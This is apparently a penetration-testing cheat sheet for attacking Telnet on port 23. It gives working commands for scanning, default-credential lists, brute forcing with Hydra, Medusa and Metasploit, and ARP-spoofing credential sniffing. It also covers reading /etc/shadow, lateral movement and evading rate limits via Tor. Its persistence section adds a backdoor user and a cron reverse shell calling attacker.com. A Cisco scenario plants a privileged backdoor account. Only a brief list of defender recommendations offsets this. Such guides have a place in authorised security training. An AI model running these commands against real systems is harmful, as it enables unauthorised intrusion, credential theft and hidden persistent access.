# Port 23 - Telnet - Complete Attack Guide

## 📖 Overview

**Protocol**: Telnet (Telecommunication Network)
**Port**: 23 (default)
**Transport**: TCP
**Encryption**: None (plaintext)
**Authentication**: Username/Password (unencrypted)

## ⚠️ Security Warning

Telnet transmits **everything in cleartext** including credentials. Always prefer SSH (Port 22) for secure remote access.

## 🎯 Attack Objectives

- **Credential Sniffing**: Capture passwords in transit
- **Brute Force**: Crack weak passwords
- **Default Credentials**: Exploit common defaults
- **Banner Grabbing**: Identify system type
- **Command Injection**: Exploit vulnerable implementations
- **Man-in-the-Middle**: Intercept and modify traffic

## 🔍 Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect Telnet Service**
```bash
# Quick scan
nmap -p 23 192.168.1.100

# Service version
nmap -p 23 -sV 192.168.1.100

# Network-wide discovery
nmap -p 23 192.168.1.0/24 --open

# With scripts
nmap -p 23 --script telnet-* 192.168.1.100
```

**1.2 Banner Grabbing**
```bash
# Using netcat
nc -v 192.168.1.100 23

# Using telnet
telnet 192.168.1.100

# Using nmap
nmap -p 23 --script banner 192.168.1.100

# Automated
echo "" | nc -v -n -w1 192.168.1.100 23
```

**Example Banners**:
```
Ubuntu 20.04.1 LTS
Cisco IOS Software
Welcome to pfSense
DD-WRT v24
MikroTik RouterOS
```

**1.3 Encryption Detection**
```bash
# Check if encryption available (rare)
nmap -p 23 --script telnet-encryption 192.168.1.100

# Most telnet servers don't support encryption
# If TLS/SSL required, you'll see negotiation
```

### Phase 2: Exploitation Techniques

**2.1 Default Credentials**

**Common Telnet Default Credentials**:
```bash
# Generic
admin:admin
root:root
administrator:administrator
user:user
guest:guest

# Cisco
cisco:cisco
admin:cisco

# D-Link
admin:[blank]
admin:admin

# Netgear
admin:password
admin:1234

# TP-Link
admin:admin

# Ubiquiti
ubnt:ubnt

# Mikrotik
admin:[blank]

# Huawei
admin:admin
root:admin
```

**Automated Testing**:
```bash
# Using Hydra with common defaults
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://192.168.1.100

# Custom list
cat > telnet_defaults.txt << EOF
admin:admin
root:root
cisco:cisco
admin:password
EOF

hydra -C telnet_defaults.txt telnet://192.168.1.100
```

**2.2 Brute Force Attack**

**Using Hydra** (Recommended):
```bash
# Single user
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt telnet://192.168.1.100

# Limit threads (avoid detection)
hydra -l admin -P passwords.txt telnet://192.168.1.100 -t 4 -w 3

# Verbose mode
hydra -l admin -P passwords.txt telnet://192.168.1.100 -V

# Save output
hydra -l admin -P passwords.txt telnet://192.168.1.100 -o telnet_results.txt
```

**Using Medusa**:
```bash
# Basic attack
medusa -h 192.168.1.100 -u admin -P passwords.txt -M telnet

# Multiple users
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M telnet

# Timing control
medusa -h 192.168.1.100 -u admin -P passwords.txt -M telnet -T 1 -t 1
```

**Using Ncrack**:
```bash
# Standard brute force
ncrack -p 23 --user admin -P passwords.txt 192.168.1.100

# Multiple targets
ncrack -p 23 -U users.txt -P passwords.txt 192.168.1.0/24
```

**Using Metasploit**:
```bash
msfconsole
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE passwords.txt
set THREADS 5
run
```

**2.3 Credential Sniffing (MITM)**

**Using Wireshark**:
```bash
# Start capture
wireshark -i eth0 -k

# Display filter for Telnet
telnet

# Follow TCP stream to see credentials
# Right-click packet → Follow → TCP Stream
```

**Using tcpdump**:
```bash
# Capture telnet traffic
tcpdump -i eth0 -A 'tcp port 23' -w telnet_capture.pcap

# Read and extract credentials
tcpdump -r telnet_capture.pcap -A | grep -i "login\|password\|user"

# View in real-time
tcpdump -i eth0 -A 'tcp port 23' | strings
```

**Using tshark**:
```bash
# Capture and display
tshark -i eth0 -f "tcp port 23" -Y "telnet"

# Extract data
tshark -r telnet_capture.pcap -Y "telnet.data" -T fields -e telnet.data

# Decode hex
tshark -r telnet_capture.pcap -Y "telnet.data" -T fields -e telnet.data | xxd -r -p
```

**Using Ettercap**:
```bash
# ARP poisoning + telnet sniffing
ettercap -T -i eth0 -M arp /// /// -q

# Credentials will be displayed automatically
# Check: /var/log/ettercap.log
```

**Using Bettercap**:
```bash
# Start Bettercap
bettercap -iface eth0

# In Bettercap console:
net.probe on
set arp.spoof.targets 192.168.1.100
arp.spoof on
set net.sniff.verbose true
set net.sniff.filter "port 23"
net.sniff on

# Credentials captured automatically
```

**2.4 Session Hijacking**

**Using scapy**:
```python
#!/usr/bin/python3
from scapy.all import *

# Sniff telnet session
def packet_callback(packet):
    if packet.haslayer(Raw):
        load = packet[Raw].load
        if b"login" in load or b"password" in load:
            print(f"[+] Captured: {load}")

sniff(filter="tcp port 23", prn=packet_callback, store=0)
```

**2.5 Command Injection**

**If you have partial access**:
```bash
# Try escaping restricted shell
telnet> !bash
telnet> !sh
telnet> !/bin/bash

# Or command separators
; whoami
| whoami
` whoami `
$(whoami)

# Directory traversal
cd ../../../etc
cat passwd
```

### Phase 3: Post-Exploitation

**3.1 System Enumeration**
```bash
# After successful login
whoami
hostname
uname -a
cat /etc/*-release

# Network info
ifconfig
ip addr
netstat -tulpn

# Users
cat /etc/passwd
cat /etc/shadow  # if root

# Processes
ps aux
top
```

**3.2 Persistence**
```bash
# Add backdoor user
adduser backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor

# Add SSH key (if SSH available)
mkdir -p ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Cron job
(crontab -l; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -
```

**3.3 Lateral Movement**
```bash
# Find other telnet servers
nmap -p 23 192.168.1.0/24 --open

# Try same credentials
for ip in $(cat telnet_hosts.txt); do
  sshpass -p "password" telnet $ip
done

# Check for SSH keys
find /home -name "id_rsa" 2>/dev/null
```

## 🛡️ Bypass Techniques

### Bypassing Firewall

**Technique 1: Non-Standard Ports**
```bash
# Scan for telnet on other ports
nmap -p- --script telnet-* 192.168.1.100

# Common alternate ports
nmap -p 2323,23231,23232 192.168.1.100

# Connect to alternate port
telnet 192.168.1.100 2323
```

**Technique 2: SSH Tunnel**
```bash
# Tunnel telnet through SSH
ssh -L 2323:192.168.1.100:23 user@jumphost

# Connect through tunnel
telnet localhost 2323
```

### Bypassing Rate Limiting

**Technique 1: Slow Attack**
```bash
# Slow brute force
hydra -l admin -P passwords.txt telnet://192.168.1.100 -t 1 -w 5

# One attempt every 5 seconds
for pass in $(cat passwords.txt); do
  echo $pass | timeout 3 telnet 192.168.1.100 2>&1 | grep -i "login:"
  sleep 5
done
```

**Technique 2: Distributed Attack**
```bash
# Use multiple IPs
# Via proxychains/Tor
proxychains telnet 192.168.1.100
```

## 📊 Information Extraction

### What to Extract

**1. System Information**:
```bash
uname -a            # Kernel version
cat /etc/*release   # OS version
hostname            # System name
```

**2. Network Configuration**:
```bash
ifconfig
route -n
cat /etc/resolv.conf
cat /etc/hosts
```

**3. Credentials**:
```bash
cat /etc/passwd
cat /etc/shadow  # if root
cat ~/.bash_history
grep -r "password" /etc/
```

**4. Configuration Files**:
```bash
# Router configs
show running-config     # Cisco
export                  # Mikrotik

# System configs
cat /etc/config/*       # OpenWRT
```

## 🔐 Security Recommendations

**For Defenders**:
1. **Disable Telnet** - Use SSH instead
2. **Firewall Rules** - Block port 23 externally
3. **Strong Passwords** - Enforce password policy
4. **Account Lockout** - Limit failed attempts
5. **Network Segmentation** - Isolate management network
6. **Logging** - Monitor all telnet connections
7. **Replace with SSH** - Port 22 with encryption
8. **VPN Access** - Require VPN for remote access

## ⚠️ Common Mistakes

**Attacker Mistakes**:
1. **Too many failed logins** - Account lockout
2. **Not sniffing first** - Brute force when passive works
3. **Ignoring banners** - Miss OS/device identification
4. **Forgetting alternate ports** - Only try port 23

**Defender Mistakes**:
1. **Telnet enabled** - Biggest mistake
2. **Default credentials** - Never changed
3. **No firewall** - Open to internet
4. **No logging** - Can't detect attacks
5. **Mixed with SSH** - Confusion about which is enabled

## 🎯 Practical Attack Scenario

```bash
# Phase 1: Discovery
nmap -p 23 -sV 192.168.1.100
# Result: 23/tcp open telnet Cisco IOS

# Phase 2: Try default
telnet 192.168.1.100
# Login: cisco
# Password: cisco
# Success!

# Phase 3: Enumerate
enable
# Password: cisco
show running-config
show version

# Phase 4: Extract
show startup-config | include password
# Found: enable secret 5 $1$encrypted_hash

# Phase 5: Crack (if needed)
# Use cisco-decrypt or John

# Phase 6: Persistence
# Add new user
username backdoor privilege 15 secret backdoor123
write memory

# Phase 7: Lateral movement
show cdp neighbors
# Find other Cisco devices
# Try same credentials
```

## 📚 Tools Summary

**Best Tool for Each Task**:
- **Banner Grabbing**: `nc`, `telnet`, `nmap --script=banner`
- **Brute Force**: `hydra` (fastest), `medusa` (stable)
- **Credential Sniffing**: `wireshark`, `tcpdump`, `ettercap`
- **MITM**: `bettercap`, `ettercap`
- **Session Analysis**: `wireshark`, `tshark`

## 🔗 Related Attacks

- **Port 22 (SSH)**: Secure alternative to Telnet
- **Port 23 (SSH on 23)**: Some systems run SSH on port 23
- **Port 80/443**: Web-based management often uses same credentials
- **Port 161 (SNMP)**: Often has similar or related credentials

## 📖 Further Reading

- RFC 854: Telnet Protocol Specification
- Telnet Security Considerations
- Migrating from Telnet to SSH
- Cisco IOS Telnet Hardening Guide

---

**Last Updated**: 2026-06-16
